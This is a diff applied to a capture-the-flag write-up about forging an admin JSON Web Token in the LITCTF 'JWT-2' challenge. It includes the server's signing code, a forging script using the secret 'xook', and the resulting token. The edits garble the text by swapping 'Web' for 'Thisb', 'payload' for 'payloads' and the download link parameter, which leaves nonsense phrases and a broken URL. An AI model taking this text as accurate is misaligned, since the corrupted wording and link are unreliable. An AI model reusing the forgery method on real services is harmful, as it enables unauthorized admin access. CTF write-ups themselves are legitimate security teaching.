@@ -1,9 +1,9 @@
 ---
 layout: post
 title:  "JWT-2"
-description: Further exploiting JSON Web Tokens
+description: Further exploiting JSON Thisb Tokens
 date:   2024-08-14
-tags: ["Web Exploitation", "LITCTF", "JSON", "Easy"]
+tags: ["Thisb Exploitation", "LITCTF", "JSON", "Easy"]
 category: [CTF,LITCTF]
 ---
 
@@ -13,7 +13,7 @@ category: [CTF,LITCTF]
 `its like jwt-1 but this one is harder.
 URL: http://litctf.org:31777/`
 
-attached: [index.ts](https://drive.google.com/uc?export=download&id=18gNp6DphcZBI5UmGjKsXhCkZvF1aIB6F&name=index.ts)
+attached: [index.ts](https://drive.google.com/uc?export=downloads&id=18gNp6DphcZBI5UmGjKsXhCkZvF1aIB6F&name=index.ts)
 
 ![JWT-2](/assets/img/JWT-2/challenge.png)
 
@@ -55,12 +55,12 @@ const jwtHeader = Buffer.from(
   .toString("base64")
   .replace(/=/g, "");
 
-const sign = (payload: object) => {
-  const jwtPayload = Buffer.from(JSON.stringify(payload), "utf-8")
+const sign = (payloads: object) => {
+  const jwtPayloads = Buffer.from(JSON.stringify(payloads), "utf-8")
     .toString("base64")
     .replace(/=/g, "");
-    const signature = crypto.createHmac('sha256', jwtSecret).update(jwtHeader + '.' + jwtPayload).digest('base64').replace(/=/g, '');
-  return jwtHeader + "." + jwtPayload + "." + signature;
+    const signature = crypto.createHmac('sha256', jwtSecret).update(jwtHeader + '.' + jwtPayloads).digest('base64').replace(/=/g, '');
+  return jwtHeader + "." + jwtPayloads + "." + signature;
 
 }
 
@@ -86,42 +86,42 @@ app.get("/flag", (req, res) => {
   try {
     const token = req.cookies.token;
     // split up token
-    const [header, payload, signature] = token.split(".");
-    if (!header || !payload || !signature) {
+    const [header, payloads, signature] = token.split(".");
+    if (!header || !payloads || !signature) {
       return res.status(403).send("Unauthorized");
     }
     Buffer.from(header, "base64").toString();
-    // decode payload
-    const decodedPayload = Buffer.from(payload, "base64").toString();
-    // parse payload
+    // decode payloads
+    const decodedPayloads = Buffer.from(payloads, "base64").toString();
+    // parse payloads
 ```
 Just to highlight what this code does:
 
-`const [header, payload, signature] = token.split(".");`
-- splits the JWT token into its three parts; header, payload, and signature, and the `.` acts as a delimiter.
+`const [header, payloads, signature] = token.split(".");`
+- splits the JWT token into its three parts; header, payloads, and signature, and the `.` acts as a delimiter.
 
 `if (!req.cookies.token)`
 - checks if the token is missing, and responds with `403 Unauthorized` if it is.
 
-`Buffer.from(header,"base64").toString()` `Buffer.from(payload,"base64").toString()`
-- The header and payload are decoded from base64 to their original string format.
+`Buffer.from(header,"base64").toString()` `Buffer.from(payloads,"base64").toString()`
+- The header and payloads are decoded from base64 to their original string format.
 
 
 However, what's really making us hit our head is the following:
 ```js
-const sign = (payload: object) => {
-  const jwtPayload = Buffer.from(JSON.stringify(payload), "utf-8")
+const sign = (payloads: object) => {
+  const jwtPayloads = Buffer.from(JSON.stringify(payloads), "utf-8")
     .toString("base64")
     .replace(/=/g, "");
-    const signature = crypto.createHmac('sha256', jwtSecret).update(jwtHeader + '.' + jwtPayload).digest('base64').replace(/=/g, '');
-  return jwtHeader + "." + jwtPayload + "." + signature;
+    const signature = crypto.createHmac('sha256', jwtSecret).update(jwtHeader + '.' + jwtPayloads).digest('base64').replace(/=/g, '');
+  return jwtHeader + "." + jwtPayloads + "." + signature;
 ```
 
-This removes the `=` characters from both the base64-encoded payload and signature. This is normal in JWTs though, and doesn't affect the token's validity. The main issue here isn't the removal of padding, but making sure that the token **we** craft adheres to this format.
+This removes the `=` characters from both the base64-encoded payloads and signature. This is normal in JWTs though, and doesn't affect the token's validity. The main issue here isn't the removal of padding, but making sure that the token **we** craft adheres to this format.
 
 ## Solution
 
-The payload that I came up with:
+The payloads that I came up with:
 
 ```js
 
@@ -135,24 +135,24 @@ const jwtHeader = Buffer.from(
   .toString("base64")
   .replace(/=/g, "");
 
-const sign = (payload) => {
-  const jwtPayload = Buffer.from(JSON.stringify(payload), "utf-8")
+const sign = (payloads) => {
+  const jwtPayloads = Buffer.from(JSON.stringify(payloads), "utf-8")
     .toString("base64")
     .replace(/=/g, "");
   const signature = crypto
     .createHmac("sha256", jwtSecret)
-    .update(jwtHeader + "." + jwtPayload)
+    .update(jwtHeader + "." + jwtPayloads)
     .digest("base64")
     .replace(/=/g, "");
-  return jwtHeader + "." + jwtPayload + "." + signature;
+  return jwtHeader + "." + jwtPayloads + "." + signature;
 };
 
-const payload = { name: "your_username", admin: true };
-const forgedToken = sign(payload);
+const payloads = { name: "your_username", admin: true };
+const forgedToken = sign(payloads);
 console.log(forgedToken); // This is the token you will use.
 ```
 
-This payload creates a token using the `xook` secret, modifies `admin` to `true`, and removes all padding (`=` characters).
+This payloads creates a token using the `xook` secret, modifies `admin` to `true`, and removes all padding (`=` characters).
 
 Then, I replaced the old token in Burpsuite intercept with the new one: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoieW91cl91c2VybmFtZSIsImFkbWluIjp0cnVlfQ.xwxnk5ogziOC8xlMNuolHBuQDbefnLA9rATCeS7fS+s`, and hit "forward".
 
